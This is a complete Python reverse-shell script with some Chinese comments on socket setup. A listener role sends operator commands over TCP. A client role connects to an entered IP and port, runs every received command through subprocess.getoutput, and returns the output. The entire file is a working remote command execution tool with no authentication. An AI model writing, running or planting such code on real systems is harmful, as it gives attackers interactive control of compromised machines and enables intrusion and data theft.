import socket
import subprocess


def start_listener(port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建一个服务器套接字
    # socket.AF_INET表示使用IPv4地址簇，AF表示Address Family 即地址簇，INET表示Internet地址簇，用于IPv4
    # SOCK_STREAM表示创建一个基于TCP协议的流式套接字，SOCK表示Socket Type，STREAM表示流式套接字，
    # socket.AF_INET,socket.SOCK_STREAM组合起来表示创建一个用于TCP/IP协议的IPv4地址的流式套接字
    server_socket.bind(('0.0.0.0', port))  # 绑定地址和端口
    server_socket.listen(1)  # 监听传入连接

    print(f"[*] Listening on 0.0.0.0:{port}")

    client_socket, client_address = server_socket.accept()  # 接受连接
    print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")

    while True:  # 与客户端通信
        command = input("shell> ")
        client_socket.send(command.encode())
        if command.lower() == 'exit':
            break
        output = client_socket.recv(4096).decode()
        print(output)

    client_socket.close()  # 关闭连接
    server_socket.close()


def start_client(target, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((target, port))

    while True:
        command = client_socket.recv(4096).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)
        client_socket.send(output.encode())

    client_socket.close()


if __name__ == "__main__":
    role = input("Choose role (server/client): ").lower()

    if role == 'server':
        port = int(input("Enter server port: "))
        start_listener(port)
    elif role == 'client':
        target_ip = input("Enter target IP: ")
        target_port = int(input("Enter target port: "))
        start_client(target_ip, target_port)
    else:
        print("Invalid role. Choose either 'server' or 'client'.")
